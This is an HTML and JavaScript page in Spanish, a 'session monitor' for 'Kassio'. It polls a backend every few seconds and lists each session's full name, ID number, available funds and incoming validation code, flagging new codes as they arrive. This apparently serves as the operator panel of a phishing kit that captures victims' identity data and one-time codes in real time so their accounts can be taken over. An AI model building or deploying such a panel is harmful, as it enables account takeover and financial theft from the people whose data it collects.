<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Monitor - Kassio</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;600;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Red Hat Display', sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
      padding: 2rem;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 2rem;
      padding-bottom: 1rem;
      border-bottom: 1px solid #334155;
    }

    .header h1 {
      font-size: 1.5rem;
      font-weight: 700;
      color: #f8fafc;
    }

    .status {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.875rem;
      color: #94a3b8;
    }

    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #22c55e;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    .sessions-grid {
      display: grid;
      gap: 1rem;
    }

    .session-card {
      background: #1e293b;
      border-radius: 12px;
      padding: 1.5rem;
      border: 1px solid #334155;
      transition: border-color 0.3s ease;
    }

    .session-card:hover {
      border-color: #0666EB;
    }

    .session-card.new {
      animation: highlight 1s ease;
    }

    @keyframes highlight {
      0% { background: #0666EB33; }
      100% { background: #1e293b; }
    }

    .session-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
      padding-bottom: 0.75rem;
      border-bottom: 1px solid #334155;
    }

    .session-id {
      font-size: 0.75rem;
      color: #64748b;
      font-family: monospace;
    }

    .session-time {
      font-size: 0.75rem;
      color: #64748b;
    }

    .data-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 1rem;
    }

    .data-item {
      display: flex;
      flex-direction: column;
      gap: 0.25rem;
    }

    .data-label {
      font-size: 0.75rem;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .data-value {
      font-size: 1rem;
      font-weight: 600;
      color: #f8fafc;
    }

    .data-value.code {
      font-family: monospace;
      font-size: 1.5rem;
      color: #22c55e;
      letter-spacing: 0.25rem;
    }

    .data-value.pending {
      color: #64748b;
      font-style: italic;
    }

    .empty-state {
      text-align: center;
      padding: 4rem 2rem;
      color: #64748b;
    }

    .empty-state h2 {
      font-size: 1.25rem;
      margin-bottom: 0.5rem;
      color: #94a3b8;
    }

    .empty-state p {
      font-size: 0.875rem;
    }

    .refresh-indicator {
      position: fixed;
      bottom: 1rem;
      right: 1rem;
      background: #1e293b;
      padding: 0.5rem 1rem;
      border-radius: 8px;
      font-size: 0.75rem;
      color: #64748b;
      border: 1px solid #334155;
    }

    @media (max-width: 768px) {
      .data-row {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Monitor de Sesiones <span id="session-count" style="background:#0666EB;padding:0.25rem 0.75rem;border-radius:20px;font-size:0.875rem;margin-left:0.5rem;">0</span></h1>
    <div class="status">
      <div class="status-dot"></div>
      <span>Polling activo (<span id="interval">3s</span>)</span>
    </div>
  </div>

  <div class="sessions-grid" id="sessions-container">
    <div class="empty-state">
      <h2>Cargando sesiones...</h2>
      <p>Esperando datos de Redis</p>
    </div>
  </div>

  <div class="refresh-indicator">
    Última actualización: <span id="last-update">-</span>
  </div>

  <script>
    let previousSessions = {};
    const POLL_INTERVAL = 3000; // 3 segundos

    function formatTime(isoString) {
      if (!isoString) return '-';
      const date = new Date(isoString);
      return date.toLocaleTimeString('es-PE', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
    }

    function renderSessions(sessions) {
      const container = document.getElementById('sessions-container');

      if (!sessions || sessions.length === 0) {
        container.innerHTML = `
          <div class="empty-state">
            <h2>Sin sesiones activas</h2>
            <p>Las sesiones aparecerán aquí cuando los usuarios se registren</p>
          </div>
        `;
        return;
      }

      container.innerHTML = sessions.map(session => {
        const data = session.data || {};
        const isNew = !previousSessions[session.session_id];
        const hasNewCode = previousSessions[session.session_id] &&
                          previousSessions[session.session_id].codigo_validacion !== data.codigo_validacion &&
                          data.codigo_validacion;

        const nombreCompleto = [data.nombre, data.apellidos].filter(Boolean).join(' ') || '-';
        const identificacion = data.identificacion || '-';
        const codigo = data.codigo_validacion || null;
        const fondo = data.fondo_disponible ? '$' + Number(data.fondo_disponible).toLocaleString('es-PE') : '-';

        return `
          <div class="session-card ${isNew || hasNewCode ? 'new' : ''}">
            <div class="session-header">
              <span class="session-id">${session.session_id}</span>
              <span class="session-time">${formatTime(data.updated_at)}</span>
            </div>
            <div class="data-row">
              <div class="data-item">
                <span class="data-label">Nombre completo</span>
                <span class="data-value">${nombreCompleto}</span>
              </div>
              <div class="data-item">
                <span class="data-label">Identificación</span>
                <span class="data-value">${identificacion}</span>
              </div>
              <div class="data-item">
                <span class="data-label">Fondo</span>
                <span class="data-value" style="color:#0666EB;font-weight:700;">${fondo}</span>
              </div>
              <div class="data-item">
                <span class="data-label">Código</span>
                <span class="data-value ${codigo ? 'code' : 'pending'}">${codigo || 'Esperando...'}</span>
              </div>
            </div>
          </div>
        `;
      }).join('');

      // Actualizar cache de sesiones previas
      previousSessions = {};
      sessions.forEach(s => {
        previousSessions[s.session_id] = s.data;
      });
    }

    async function fetchSessions() {
      try {
        const response = await fetch('/api/kassio/sessions');
        const result = await response.json();

        console.log('API Response:', result);

        if (result.success) {
          document.getElementById('session-count').textContent = result.count;
          renderSessions(result.sessions);
        }

        document.getElementById('last-update').textContent = new Date().toLocaleTimeString('es-PE');
      } catch (error) {
        console.error('Error fetching sessions:', error);
        document.getElementById('session-count').textContent = 'Error';
      }
    }

    // Polling inicial y periódico
    fetchSessions();
    setInterval(fetchSessions, POLL_INTERVAL);
  </script>
</body>
</html>
